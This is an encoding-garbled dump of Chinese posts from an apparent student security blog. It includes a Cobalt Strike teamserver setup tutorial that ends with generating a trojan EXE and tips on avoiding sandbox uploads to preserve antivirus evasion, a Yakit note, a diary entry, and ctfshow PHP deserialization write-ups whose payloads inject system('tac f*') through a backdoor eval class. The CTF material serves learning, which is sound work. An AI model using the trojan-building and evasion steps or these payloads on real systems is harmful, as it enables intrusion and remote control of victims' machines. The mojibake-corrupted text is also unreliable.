ä¸ªæˆ‘çœ‹çš„æ•™ç¨‹é“¾æ¥\t[å·¥å…·åˆ†äº« | CobaltStrikeå®‰è£…ä¸ç®€å•ä½¿ç”¨](https://mp.weixin.qq.com/s/5uZiJECpPw8pfLc0JstZ0g)          \n\næˆ‘çš„æœåŠ¡å™¨çš„ç¯å¢ƒæ˜¯centos è¿™ä¸ªæ˜¯[centosçš„javaç¯å¢ƒé…ç½®](https://blog.csdn.net/Xx47585874/article/details/124849471?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522e28769ae6fb6d0ed23b60bd85ff4db25%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=e28769ae6fb6d0ed23b60bd85ff4db25&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124849471-null-null.142^v101^pc_search_result_base3&utm_term=centos%E5%AE%89%E8%A3%85java&spm=1018.2226.3001.4187)\n\né¦–å…ˆå°±æ˜¯æœåŠ¡ç«¯éœ€è¦Javaç¯å¢ƒ,å…·ä½“çš„å…¶ä»–æ“ä½œå¯ä»¥å»ç½‘ä¸ŠæŸ¥ï¼Œæˆ‘åªè¯´æˆ‘ç”¨çš„æœ€æ–¹ä¾¿æ— è„‘çš„æ–¹æ³•\n\nåˆ©ç”¨[yum](https://so.csdn.net/so/search?q=yum&spm=1001.2101.3001.7020)æºæ¥å®‰è£…jdkï¼ˆæ­¤æ–¹æ³•ä¸éœ€è¦é…ç½®ç¯å¢ƒå˜é‡ï¼‰\n æŸ¥çœ‹yumåº“ä¸­çš„javaå®‰è£…åŒ… ï¼š`yum -y list java*`\n å®‰è£…éœ€è¦çš„jdkç‰ˆæœ¬çš„æ‰€æœ‰javaç¨‹åºï¼šyum -y install java-1.8.0-openjdk* (å®‰è£…å®Œä¹‹åï¼Œé»˜è®¤çš„å®‰è£…ç›®å½•æ˜¯åœ¨: /usr/lib/[jvm](https://so.csdn.net/so/search?q=jvm&spm=1001.2101.3001.7020)/java-1.8.0-openjdk-1.8.0.151-1.b12.el7_4.x86_64)\n\nç„¶åè¾“å…¥java -version\n\n![image-20250218183004910](http://images.lwwww.top/images/20250218190410161.png)\n\nè¿™æ ·å°±æ˜¯æ­£å¸¸äº†\n\nç„¶åè¿™ä¸ªæ—¶å€™ä½ çš„å®‰è£…åŒ…åº”è¯¥æ˜¯ä¸‹å¥½äº†è§£å‹ä¹‹åæ˜¯è¿™æ ·çš„\n\n![image-20250218183113424](http://images.lwwww.top/images/20250218190415756.png)\n\nå»æŠŠServeræƒ³åŠæ³•æ”¾åˆ°æœåŠ¡ç«¯é‡Œé¢ï¼Œç”¨ä»€ä¹ˆåè®®ä¹Ÿå¥½ï¼Œä¼ zipä¹Ÿè¡Œï¼Œæˆ‘æ˜¯ç›´æ¥finalshellæ‹–è¿›å»çš„ï¼Œå®Œæˆåè¿›å…¥åˆ°Serverçš„ç›®å½•ä¸‹å¯¹teamserveræ–‡ä»¶å¢åŠ æ‰§è¡Œæƒé™ \t`chmod +x teamserver` \tç„¶åå°±å¾—æŠŠè¿™ä¸ªæœåŠ¡ç«¯çš„æœåŠ¡èµ·æ¥äº†\n\nåœ¨ä¸‹ä¸€æ­¥ä¹‹å‰ä½ è¦çŸ¥é“å¦‚æœä½ æ˜¯ä¹°çš„äº‘æœåŠ¡å™¨çš„è¯ï¼Œä½ å¿…é¡»è¦å¹²çš„ä¸€ä»¶äº‹å°±æ˜¯å»å®‰å…¨ç»„é‡Œé¢æŠŠå…¥è§„åˆ™æ”¹ä¸€ä¸‹ï¼Œè¿è¡Œall å¯¹ä½ è®¾å®šçš„ç«¯å£è¿›è¡Œtcpè¿æ¥ï¼Œå¦‚æœä¸å¤ªæ‡‚å¾—è¯é‚£å°±æŒ‰ç…§æˆ‘è¿™ä¸ªæ ·å­æ”¹ä¸€ä¸‹å°±æ¬§å…‹\n\n![image-20250218184007106](http://images.lwwww.top/images/20250218190420845.png)\n\nè®°å¾—ä¹Ÿè¦åœ¨Linuxæœ¬æœºä¸Šé¢å¼€æ”¾ç«¯å£\n\nå¼€æ”¾ç«¯å£\n\n**firewall-cmd --zone=public --add-port=5672/tcp --permanent**  # å¼€æ”¾5672ç«¯å£\n\n**firewall-cmd --zone=public --remove-port=5672/tcp --permanent** #å…³é—­5672ç«¯å£\n\n**firewall-cmd --reload**  # é…ç½®ç«‹å³ç”Ÿæ•ˆ\n\næ”¹æˆ50050ç«¯å£å°±è¡Œè¿™æ˜¯csé»˜è®¤å¾—ï¼Œè®°å¾—ä¸€å®šè¦è¿›è¡Œé…ç½®ç«‹å³ç”Ÿæ•ˆçš„å‘½ä»¤è¦ä¸ç„¶è¦ç­‰å¾ˆä¹…\n\n1ã€å¯åŠ¨æœåŠ¡ç«¯ã€‚\n\n./teamserver 127.0.0.1 passwd    \t\t#127.0.0.1æœåŠ¡ç«¯çœŸå®IPï¼ˆæœ€å¥½å†™å…¬ç½‘ipï¼‰ åé¢å¯†ç éšæ„ã€‚\n\n![image-20250218183724547](http://images.lwwww.top/images/20250218190513450.png)\n\nå¤§æ¦‚æ˜¯è¿™æ ·ï¼Œå¦‚æœæŠ¥é”™äº†è®°å¾—é—®aiè§£å†³ï¼Œåº”è¯¥æ˜¯é—®é¢˜ä¸å¤§äº†\n\nç„¶åå°±æ˜¯å»å®¢æˆ·ç«¯æŠŠcsè¿ä¸Šäº†\n\n![image-20250218185207045](http://images.lwwww.top/images/20250218190426297.png)\n\n![image-20250218185257646](http://images.lwwww.top/images/20250218190429273.png)\n\nHOSTå°±æ˜¯ä½ æœåŠ¡å™¨çš„å…¬ç½‘ip portéƒ½æ˜¯è‡ªå®šä¹‰çš„ä¸è¢«å ç”¨å°±æ˜¯ï¼Œé»˜è®¤éƒ½æ˜¯50050 passwordå°±æ˜¯ä½ å‘½ä»¤é‡Œé¢è®¾ç½®é‚£ä¸ª\n\nä»¥ä¸Šå±äºæ˜¯è°ƒè¯•csäº†ï¼Œç„¶åä¸‹é¢æ‰æ˜¯ç›®çš„---ç”Ÿæˆæœ¨é©¬\n\n![image-20250218185511497](http://images.lwwww.top/images/20250218190439982.png)\n\n![image-20250218185553846](http://images.lwwww.top/images/20250218190443691.png)\n\n\n\n![image-20250218185827719](http://images.lwwww.top/images/20250218190449174.png)\n\n\n\nç„¶åæœ‰ç›‘å¬äº†å°±å»ç”Ÿæˆexe\n\n![image-20250218185948239](http://images.lwwww.top/images/20250218190501079.png)\n\n![image-20250218190047341](http://images.lwwww.top/images/20250218190455140.png)\n\nç„¶åä½ å°±å¯ä»¥æœ‰ä¸€ä¸ªå°æœ¨é©¬å’¯\n\nè®°å¾—ä¸è¦æ‰”åˆ°å¾®æ­¥æˆ–è€…åˆ«çš„äº‘æ²™ç®± èµµå¸ˆå‚…å‘Šè¯‰æˆ‘è¯´å¦‚æœæ‰”è¿›å»äº†ä½ çš„è¿™ä¸ªexeçš„æœåŠ¡å™¨ipä¼šè¢«è®°ä½ç„¶åå°±å¾ˆéš¾è¿‡å…æ€äº†\n\nä»¥åæœ‰ç©ºæˆ‘å†å»ç ”ç©¶ä¸€ä¸‹å¦‚æœè¿‡å…æ€å“ˆå“ˆ\n\n\n\n","tags":["-WEB -æ¸—é€ -æœ¨é©¬"]},{"title":"Yakitå­¦ä¹ ","url":"/2025/02/15/Yakitå­¦ä¹ /","content":"\nå…ˆæ±‡æŠ¥ä¸€ä¸‹è¿‘å†µï¼Œæ²¡å’‹å­¦ä¹ ï¼Œæœ¬èº«æ‰“ç®—å¥½å¥½å­¦ä¹ ä¸€ä¸‹ååºåˆ—åŒ–å’Œsstiçš„ä½†æ˜¯ä¸€ç›´çŠ¯æ‡’ä¸æƒ³å­¦ï¼Œè¿™å‡ å¤©æœ‰ä¸ªé¡¹ç›®æˆ‘çœ‹ç€æŒºå¥½çš„ï¼Œç»™æœ¬åœ°çš„å›½ä¼åŸ¹è®­æ¸—é€æµ‹è¯•ä¸€å¤©1.5kï¼Œä¸€æ•´å¥—ä¸‹æ¥1.5wçœŸæ˜¯é¦‹æ­»æˆ‘äº†ï¼Œä½†æ˜¯æ°´å¹³çœŸæ˜¯æœ‰é™ï¼Œæˆ‘éƒ½è°ç§°è‡ªå·±å¤§ä¸‰äº†è¿˜æ˜¯æ²¡çœ‹ä¸Šæˆ‘ï¼Œç”šè‡³è¿é¢è¯•çš„ç¯èŠ‚éƒ½æ²¡æœ‰ã€‚æˆ‘è¿˜åœ¨å†…å¿ƒçº ç»“äº†å¾ˆä¹…å¾ˆä¹…æˆ‘åˆ°åº•èƒ½ä¸èƒ½å¹²è¿™ä¸ªæ´»\n\n\n\n![image-20250215140034297](http://images.lwwww.top/20250217213255306.png)\n\næœ¬æ¥çš„ç®—ç›˜æ˜¯è¿›é˜¶webå®åŠ›çš„ä½†æ˜¯ç°åœ¨çœ‹æ¥æˆ‘å¥½åƒä¹Ÿå¯¹ctfæ²¡æœ‰é‚£ä¹ˆé‚£ä¹ˆæ¸´æœ›ã€‚æ„Ÿè§‰è‡ªå·±æŒºä¸è´Ÿè´£çš„è¿˜æ²¡å•¥æ¯…åŠ›å’Œè€å¿ƒï¼Œå…ˆä¸ç®¡äº†ï¼Œåæ­£æ˜¯æ‰“ç®—å­¦ç€ç”¨ç”¨yakitç„¶åç†Ÿæ‚‰ç†Ÿæ‚‰æ¸—é€æµ‹è¯•çš„ã€‚åˆšæ‰æè¿™ä¸ªç ´å›¾åºŠæäº†å¥½ä¹…æ„Ÿè§‰ä¹Ÿæ²¡ææ˜ç™½ä¹±ä¸ƒå…«ç³Ÿçš„å…ˆä¸ç®¡äº†å›å¤´åœ¨è°ƒæ•´å§ã€‚çœŸæ˜¯çƒ¦æ­»äº†ï¼Œæ„Ÿè§‰è‡ªå·±çœŸæ˜¯ç¬¨æ­»äº†ï¼Œé‚£äº›å¤§ç‰›å­ä»¬ä¸ºä»€ä¹ˆä¼šé‚£ä¹ˆå¤šä¸œè¥¿å“‡ï¼ŸğŸ˜‘ğŸ˜‘ğŸ˜‘\n\n\n\nyakitæ˜¯yakå»¶ç”³å‡ºæ¥çš„ä¸€ä¸ªgui yaklangå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªä¸“é—¨ä¸ºç½‘ç»œå®‰å…¨è€Œç”Ÿçš„è¯­è¨€ï¼Œç”¨æ¥å¼€å‘å„ç§å¹³å°äº§å“ä¹‹ç±»çš„ï¼Œä»golangå»¶ä¼¸å‡ºæ¥çš„ï¼šå®ƒæ—¨åœ¨ç®€åŒ–æ¸—é€æµ‹è¯•ã€æ¼æ´åˆ©ç”¨ã€å®‰å…¨å·¥å…·å¼€å‘ç­‰ä»»åŠ¡ï¼Œæä¾›é«˜åº¦é›†æˆåŒ–çš„å®‰å…¨åŠŸèƒ½æ¨¡å—å’Œä¾¿æ·çš„è¯­æ³•ï¼Œå¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜å¿«é€Ÿå®ç°å¤æ‚çš„æ”»é˜²åœºæ™¯ã€‚\n\n![image-20250215233214351](http://images.lwwww.top/images/20250217214245255.png)\n\n*MITMï¼ˆman-in-the-middleï¼‰æ“ä½œå°==burpsuite*\n\nè¿™é‡Œæ”¾ä¸Šé“¾æ¥[Yakit](https://www.yaklang.com/products/intro)ä¸‹è½½å’Œå®‰è£…ç­‰æ•™ç¨‹éƒ½éå¸¸è¯¦ç»†è¿™é‡Œä¸è¿›è¡Œè¿‡å¤šèµ˜è¿°![image-20250216002124571](http://images.lwwww.top/images/20250217214331739.png)\n\n\n\nç„¶åå°±æ˜¯yakitæœ‰ä¸ªæœ¬åœ°æ¨¡å¼å’Œè¿œç¨‹æ¨¡å¼ï¼Œå¯¹äºæˆ‘æ¥è¯´ç›®å‰ç”¨ä¸ä¸Šè¿œç¨‹æ¨¡å¼å“ˆå“ˆ\n\nå¦‚æœä¼šç©bpå¯ä»¥ç›´æ¥çœç•¥yakitçš„å­¦ä¹ äº†ï¼Œå› ä¸ºæˆ‘å¬äº†ç‚¹è§†é¢‘å‘ç°æ²¡å•¥å†…å®¹èƒ½è®°å½•ä¸‹æ¥ã€‚\n\nã€ã€å¹²è´§ã€‘Yakitä½¿ç”¨æ•™ç¨‹01-å…¥é—¨ç®€ä»‹ä¸å®‰è£…æ•™ç¨‹ã€‘https://www.bilibili.com/video/BV1Cg4y1u7VD?vd_source=549b9e183402012ff590dc727d995039æ”¾ä¸Šå®˜æ–¹çš„æ•™ç¨‹è‡ªå·±çœ‹å§\n\nè¡¥å……ä¸€ç‚¹ï¼Œæˆ‘åœ¨è¿›è¡Œyakitæœ¬åœ°é¶åœºæµ‹è¯•çš„æ—¶å€™ï¼Œæœ‰çš„é¢˜ç›®æ˜¯å¯ä»¥ç›´æ¥hackerbarè§£å†³ä½†æ˜¯ä¸ºäº†ç†Ÿæ‚‰yakit æ‰€ä»¥æˆ‘å†³å®šç”¨yakitéº»çƒ¦ç‚¹å»åšï¼Œä½†æ˜¯ä¸€ç›´æŠ“ä¸åˆ°æœ¬åœ°é¶åœºçš„åŒ…ï¼Œæ‰€ä»¥ç»è¿‡å¿«ä¸€å‘¨çš„æµ‹è¯•å’Œç ”ç©¶å½“ç„¶ä¹Ÿæ˜¯ä¸»è¦æ²¡æ€ä¹ˆç ”ç©¶å…‰ç ”ç©¶å›¾åºŠä¸ºä»€ä¹ˆä¸é€šäº†ã€‚\n\næœ€åæ‰¾åˆ°ä¸€ä¸ªé—®é¢˜çš„å…³é”®ç‚¹å°±æ˜¯ï¼Œä»£ç†è‡ªåŠ¨è®¾ç½®æˆäº†æœ¬åœ°ä¸»æœºä¸ç»è¿‡ä»£ç†ï¼Œæ‰€ä»¥ä¹Ÿå°±æŠ“ä¸åˆ°åŒ…ã€‚ç”¨è¿™ä¸ªæ€è·¯åŸºæœ¬ä¸Šå°±èƒ½è§£å†³äº†,\n","tags":["-æ¸—é€ -web -yakit -å­¦ä¹ "]},{"title":"20250207","url":"/2025/02/07/20250207/","content":"\n\n\nä»Šå¤©12ç‚¹å¤šå› ä¸ºå¤ªé¥¿äº†æ‰€ä»¥å†³å®šæ—©ç¡ï¼Œä½†æ˜¯æ²¡æœ‰æ—©èµ·ï¼Œèµ–åºŠèµ–åˆ°å…«ç‚¹äº”åï¼Œèµ·åºŠæŠŠæ˜¨å¤©ä¹°çš„æ‰‹æ“€é¢ç…®ä¸Šäº†ï¼Œæ”¾äº†ä¸€ç‚¹é¸¡ç²¾ è€—æ²¹ ç”ŸæŠ½ å’Œå¥½å‡ ä¸ªé¸¡è›‹ã€‚ç¾ç¾çš„åƒå®Œäº†æ—©é¥­ï¼Œé¦™æ‹½äº†ï¼ç„¶åå°±æ˜¯å›°~ æ™•ç¢³å—ï¼Ÿ\n\nåƒå®Œå‘ç°ä½“é‡å¤šäº†å¿«ä¸¤å…¬æ–¤ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰æˆ‘è¿›è‚šé‡Œçš„ä¸œè¥¿è¿˜æ²¡ä¸€æ–¤å‘¢ã€‚åå¤ç§°äº†å¥½å‡ æ¬¡ï¼Œç§°åˆ°äº†ä¸€ä¸ªæ»¡æ„çš„ä½“é‡,æˆ‘æ‰æ”¾è¿‡ä¸å¬è¯çš„ä½“é‡ç§¤ã€‚æœ¬æ¥æ‰“ç®—åƒå®Œå°±å»è¿åŠ¨æ¶ˆåŒ–ä¸€ä¸‹ï¼Œåˆ«åƒèƒ–äº†å‰åŠŸå°½å¼ƒï¼Œä½†æ˜¯å»é”»ç‚¼çš„è·¯ä¸Šçªç„¶é­é‡ç½ªå¤§æ¶ææ€¨å¿µç¼ èº«çš„æ¶åºŠï¼Œä¸ºäº†æ‹¯æ•‘ä¸–ç•Œä¸è®©å®ƒç ´åä¸–ç•Œå’Œå¹³ï¼Œæˆ‘æ¯…ç„¶å†³ç„¶å˜æˆå°çŒªğŸ–ç¡æœå®ƒã€‚\n\nä¸€ç›´ç¡åˆ°11ç‚¹åŠå®ƒæ‰è‚¯ç½¢ä¼‘ï¼ŒçœŸæ˜¯ å¤ªå¯æ¶äº†ã€‚äºŒæ¬¡èµ·åºŠä¹‹åæˆ‘å»ç»™pwnpwnï¼ˆèƒ–èƒ–ï¼‰å–‚å¥¶ï¼Œå®ƒè·Ÿæ¶é¬¼ä¸€æ ·è£¹ç€å¥¶å˜´å°±å¨å¨å¸ï¼Œé¼»å­å…¨æ˜¯å¥¶æ³¡ä¹Ÿåœä¸ä¸‹æ¥ã€‚\n\nä»Šå¤©çœŸçˆ½ï¼Œå˜»å˜»ã€‚åƒé¥­çœŸå¥½ğŸ‘\n","tags":["-éšç¬”"]},{"title":"æµ…å­¦PHPååºåˆ—åŒ–","url":"/2025/01/31/æµ…å­¦PHPååºåˆ—åŒ–/","content":"\n\n\n# æµ…å­¦PHPåºåˆ—åŒ–ï¼šserialize()\n\nåºåˆ—åŒ–:æŠŠå¯¹è±¡è½¬æ¢ä¸ºå¯ä¼ è¾“çš„å­—èŠ‚åºåˆ—çš„è¿‡ç¨‹--æ˜¯ä¸ºäº†è§£å†³åœ¨ä¸åŒçš„æœºå™¨ä¹‹é—´ä¼ è¾“å¤æ‚æ•°æ®ç±»å‹çš„ä¸€ç§æœºåˆ¶\n\nåºåˆ—åŒ–æ˜¯å°†å˜é‡æˆ–å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼Œç”¨äºå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ã€‚\n\næœ¬æ¬¡å­¦ä¹ ä¸»è¦å‚è€ƒ[baozongwi](https://baozongwi.xyz/)å¸ˆå‚…çš„php[ååºåˆ—åŒ–æ–‡ç« ](https://baozongwi.xyz/2024/09/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-pop/)å’Œ[Y4tacker](https://y4tacker.github.io/)çš„[[CTF]PHPååºåˆ—åŒ–æ€»ç»“](https://y4tacker.blog.csdn.net/article/details/113588692?fromshare=blogdetail&sharetype=blogdetail&sharerId=113588692&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)è¾…åŠ©å­¦ä¹ ğŸ˜˜\n\nCTFSHOWé¶åœºä¸»è¦å‚è€ƒZredamanJå¸ˆå‚…çš„[ctfshow ååºåˆ—åŒ–](https://blog.csdn.net/qq_61237064/article/details/123331126?fromshare=blogdetail&sharetype=blogdetail&sharerId=123331126&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)\n\næ¨èè¯¾ç¨‹é™ˆè…¾è€å¸ˆçš„[ååºåˆ—åŒ–è¯¾ç¨‹](https://www.bilibili.com/video/BV1R24y1r71C?vd_source=549b9e183402012ff590dc727d995039)é™ˆè…¾è€å¸ˆçš„sstiçš„è¯¾ä¹Ÿå¾ˆå¥½ğŸ‘\n\nååºåˆ—åŒ–:æŠŠå­—èŠ‚åºåˆ—åŒ–è½¬æ¢ä¸ºå¯¹è±¡çš„è¿‡ç¨‹\n\nåºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„æœ€ç»ˆç›®çš„:å®ç°å¯¹è±¡çš„è·¨å¹³å°å­˜å‚¨,ç½‘ç»œä¼ è¾“\n\nä¸ºä»€ä¹ˆè¦æœ‰åºåˆ—åŒ–å‘¢ï¼Ÿ\n\nå°±æ˜¯å› ä¸ºåºåˆ—åŒ–æ–¹ä¾¿å‘—,å ç”¨å°ç©ºé—´ä¼ é€’æ›´å¤šçš„ä¿¡æ¯\n\n```php\ndemo:\n<?php\nclass me{\n    public $name=lww;\n    public $age=20;\n    public  $ctf=web;\n}\necho serialize(new me());\n\nå›æ˜¾ï¼šO:2:\"me\":3:{s:4:\"name\";s:3:\"lww\";s:3:\"age\";i:20;s:3:\"ctf\";s:3:\"web\";}\n```\n\nåœ¨è¿™é‡Œçš„æ ¼å¼ä¸ºï¼šå˜é‡ç±»å‹:ç±»åé•¿åº¦:ç±»å:å±æ€§æ•°é‡:{å±æ€§ç±»å‹:å±æ€§åé•¿åº¦:å±æ€§å;å±æ€§å€¼ç±»å‹:å±æ€§å€¼é•¿åº¦:å±æ€§å€¼å†…å®¹\n\nåœ¨è¿™é‡Œè¿˜æ¶‰åŠåˆ°ä¸€ä¸ªåŸºç¡€çš„çŸ¥è¯†ç‚¹å°±æ˜¯phpæ˜¯é¢å‘å¯¹è±¡çš„å¦‚æœä¸äº†è§£å¯ä»¥å»[èœé¸Ÿæ•™ç¨‹](https://www.runoob.com/php/php-oop.html)ç†Ÿæ‚‰ä¸€ä¸‹\n\n### é­”æœ¯æ–¹æ³•\n\nPHP ä¸­çš„é­”æœ¯æ–¹æ³•æ˜¯æŒ‡é‚£äº›ä»¥åŒä¸‹åˆ’çº¿ï¼ˆ__ï¼‰å¼€å¤´çš„ç‰¹æ®Šæ–¹æ³•ã€‚å®ƒä»¬åœ¨ç‰¹å®šçš„æƒ…å†µä¸‹è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨äºæ‰§è¡Œç‰¹å®šçš„åŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨å¯¹è±¡åºåˆ—åŒ–æ—¶ã€è®¿é—®æœªå®šä¹‰çš„å±æ€§æˆ–æ–¹æ³•æ—¶ç­‰ã€‚è¿™äº›æ–¹æ³•ä¸ºPHPç¼–ç¨‹æä¾›äº†å¼ºå¤§çš„å·¥å…·ï¼Œä½¿å¾—å¯ä»¥æ›´ç®€æ´åœ°æ‰§è¡Œå¤æ‚çš„ä»»åŠ¡ã€‚\n\n    __construct() //å½“åˆ›å»ºæ–°å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚\n    __destruct() //å¯¹è±¡ä¸å†è¢«ä½¿ç”¨ä¸”éœ€è¦è¢«é”€æ¯æ—¶è°ƒç”¨ã€‚\n    __call($name, $arguments) //å½“è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è°ƒç”¨ã€‚\n    __callStatic($name, $arguments) //å½“è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®çš„é™æ€æ–¹æ³•æ—¶è°ƒç”¨ã€‚\n    __get($name) //ç”¨äºè¯»å–ä¸å¯è®¿é—®çš„å±æ€§ã€‚\n    __set($name, $value) //ç”¨äºå†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ã€‚\n    __isset($name) //å½“å¯¹ä¸å¯è®¿é—®çš„å±æ€§è°ƒç”¨ isset() æˆ– empty() æ—¶è¢«è°ƒç”¨ã€‚\n    __unset($name) //å½“å¯¹ä¸å¯è®¿é—®çš„å±æ€§è°ƒç”¨ unset() æ—¶è¢«è°ƒç”¨ã€‚\n    __toString() //å½“å°è¯•å°†å¯¹è±¡å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºæ—¶è°ƒç”¨ã€‚\n    __invoke() //å½“å°è¯•å°†å¯¹è±¡å½“ä½œå‡½æ•°è°ƒç”¨æ—¶æ‰§è¡Œã€‚\n    __clone() //å½“å¯¹è±¡è¢«å¤åˆ¶æ—¶è°ƒç”¨ã€‚\n    __sleep() //åœ¨åºåˆ—åŒ–å‰è°ƒç”¨ï¼Œç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›è¡¨ç¤ºå“ªäº›å±æ€§éœ€è¦è¢«åºåˆ—åŒ–çš„æ•°ç»„ã€‚\n    __wakeup() //åœ¨ååºåˆ—åŒ–åè°ƒç”¨ï¼Œç”¨äºé‡æ–°åˆå§‹åŒ–å¯¹è±¡çš„å±æ€§æˆ–æ‰§è¡Œå…¶ä»–é‡å»ºä»»åŠ¡ã€‚\n\nå­˜åœ¨è‡ªåŠ¨è°ƒç”¨,å¯ä»¥ç›¸äº’è°ƒç”¨\n\n\n\n\n\n# ctfshow ååºåˆ—åŒ–\n\n\n\n#### web254\n\næºç :\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this->isVip;\n    }\n    public function login($u,$p){\n        if($this->username===$u&&$this->password===$p){\n            $this->isVip=true;\n        }\n        return $this->isVip;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this->isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = new ctfShowUser();\n    if($user->login($username,$password)){\n        if($user->checkVip()){\n            $user->vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n} \n```\n\n\n\n**payload**\n\n`https://03de7056-2630-45a9-b5a3-f21a6e0a8e3c.challenge.ctf.show/?username=xxxxxx&password=xxxxxx`\n\n#### web255\n\n```php\n<?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this->isVip;\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this->isVip){\n            global $flag;\n            echo \"your flag is \".$flag;\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = unserialize($_COOKIE['user']);    \n    if($user->login($username,$password)){\n        if($user->checkVip()){\n            $user->vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n} \n\n/*å‘ç°è¦ä»cookieä¸­è·å–å€¼å¹¶ä¸”éœ€è¦æŠŠflaseæ”¹ä¸ºture*/\n```\n\n\n\n\n\n```php\npayload\n<?php\nclass ctfShowUser{\n    public $isVip='true';\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n}\n$a=new ctfShowUser();\necho urlencode( serialize($a));\n\nO%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bs%3A4%3A%22true%22%3Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3B%7D\nurl?username=xxxxxx&passname=xxxxxx\n\n```\n\n\n\n#### web256\n\n```php\n<?php\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip(){\n        return $this->isVip;\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function vipOneKeyGetFlag(){\n        if($this->isVip){\n            global $flag;\n            if($this->username!==$this->password){\n                echo \"your flag is \".$flag;\n            }\n        }else{\n            echo \"no vip, no flag\";\n        }\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = unserialize($_COOKIE['user']);\n    if($user->login($username,$password)){\n        if($user->checkVip()){\n            $user->vipOneKeyGetFlag();\n        }\n    }else{\n        echo \"no vip,no flag\";\n    }\n}\n\nè¿™ä¸ªé¢˜å…¶å®å°±æ˜¯ä½¿å¾—usernameä¸passwordä¸ç›¸åŒï¼Œç”¨ä¸Šé¢˜çš„è„šæœ¬ç¨ä½œä¿®æ”¹å°±è¡Œ\n```\n\n#### web257\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfShowUser{\n    private $username='xxxxxx';\n    private $password='xxxxxx';\n    private $isVip=false;\n    private $class = 'info';\n\n    public function __construct(){\n        $this->class=new info();\n    }\n    public function login($u,$p){\n        return $this->username===$u&&$this->password===$p;\n    }\n    public function __destruct(){\n        $this->class->getInfo();\n    }\n\n}\n\nclass info{\n    private $user='xxxxxx';\n    public function getInfo(){\n        return $this->user;\n    }\n}\n\nclass backDoor{\n    private $code;\n    public function getInfo(){\n        eval($this->code);\n    }\n}\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) && isset($password)){\n    $user = unserialize($_COOKIE['user']);\n    $user->login($username,$password);\n}\n```\n\n\n\n```php\npayloadï¼š\n<?php \nclass ctfShowUser{\n   private $class;\n   public function __construct(){\n    $this->class=new backDoor();//è¿™å°±æ˜¯åœ¨åˆ›å»ºæ—¶è¢«è°ƒç”¨\n }\n}\nclass backDoor{\n    private $code=\"system('tac f*');\";          //åœ¨å®é™…ä¸­å¤šè¯•è¯•tac /f*æˆ–è€…tac f*\n}\n$a=new ctfShowUser();\necho urlencode(serialize($a));\nä¸èƒ½ç›´æ¥private $class=new backDoor();æ¥èµ‹ç»™classä¸€ä¸ªç±»çš„å€¼ï¼Œåªèƒ½é€šè¿‡__constructæ¥èµ‹å€¼ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥èµ‹ç»™å…¶å­—ç¬¦çš„å€¼ã€‚\nè¦æ³¨æ„çš„æ˜¯ç”¨userä¼ å‘½ä»¤æ—¶éœ€è¦å¸¦ä¸ªåˆ†å·\n\tçœ‹å¥½è¦æ±‚æ˜¯å»cookieé‡Œé¢ä¼ å‚\n```\n\n**construct--demo**\n\n```php\n<?php\n/* construct æ„é€ å‡½æ•°ï¼Œå½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ã€‚å…·æœ‰æ„é€ 